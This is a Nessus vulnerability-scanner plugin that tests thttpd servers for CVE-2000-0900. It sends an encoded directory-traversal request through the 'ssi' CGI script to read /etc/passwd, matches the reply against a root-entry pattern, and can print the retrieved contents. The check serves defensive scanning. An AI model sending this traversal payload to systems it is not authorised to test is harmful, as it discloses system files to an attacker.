#
# This script was written by Thomas Reinke <reinke@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(10523);
 script_version ("$Revision: 1.30 $");
 script_cve_id("CVE-2000-0900");
 script_bugtraq_id(1737);
 script_osvdb_id(422);
 
 script_name(english:"thttpd ssi Servlet Encoded Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The version of thttpd running on the remote host comes with a CGI
script, 'ssi', that fails to completely sanitize its PATH_TRANSLATED
argument of encoded directory sequences.  An unauthenticated, remote
attacker can use this issue to read arbitrary files on the remote
host, subject to the privileges under which the web server operates." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Oct/29");
 script_set_attribute(attribute:"solution", value:
"Upgrade to thttpd version 2.20 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/10/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/10/02");
 script_cvs_date("$Date: 2016/11/03 20:40:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
 script_summary(english:"Tries to read a local file");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2016 Thomas Reinke");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

# Unless we're paranoid, make sure the banner, if there is one, 
# looks like thttpd.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (banner && "Server: thttpd/" >!< banner) exit(0);
}

file = "/etc/passwd";
file_pat = "root:.*:0:[01]:";

foreach dir (cgi_dirs())
{
  url = string(dir, "/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e", file);

  buf = http_get(item:url, port:port);
  rep = http_keepalive_send_recv(port:port, data:buf);
  if( rep == NULL ) exit(0);

  # There's a problem if we see that file.
  if (egrep(pattern:file_pat, string:rep))
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to retrieve the contents of '", file, "' on the\n",
        "remote host using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        report = string(
          report,
          "\n",
          "Here are the contents :\n",
          "\n",
          "  ", str_replace(find:'\n', replace:'\n  ', string:rep), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
